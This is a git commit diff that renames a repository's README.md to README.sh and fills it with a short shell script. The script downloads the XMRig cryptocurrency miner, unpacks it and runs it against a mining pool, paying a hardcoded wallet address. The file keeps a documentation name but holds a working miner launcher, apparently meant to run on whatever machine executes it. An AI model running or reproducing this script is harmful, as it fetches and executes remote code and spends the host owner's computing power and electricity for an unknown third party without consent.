e2196c53ee90e872947d8f1a0ed90bb5ea54dffe
YesMyPower <166229619+YesMyPower@users.noreply.github.com>
2024-04-06 20:48:32 +0700

    Update and rename README.md to README.sh

---
+++ README.sh
@@ -0,0 +1,3 @@
+# Idk
+mkdir kd && cd kd && wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz; tar -xf xmrig-6.21.1-linux-x64.tar.gz
+./xmrig --url pool.hashvault.pro:443 --user ZEPHsCP2Ti2dgkPv7wAmDk3oSohUNHZutb5AbUY8P9hQBk7aHJQ2ZU9DKHeQnv5zPmXx1EexZF1Edg4HVCyumq1y5GZ9FVTk6me --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads=2
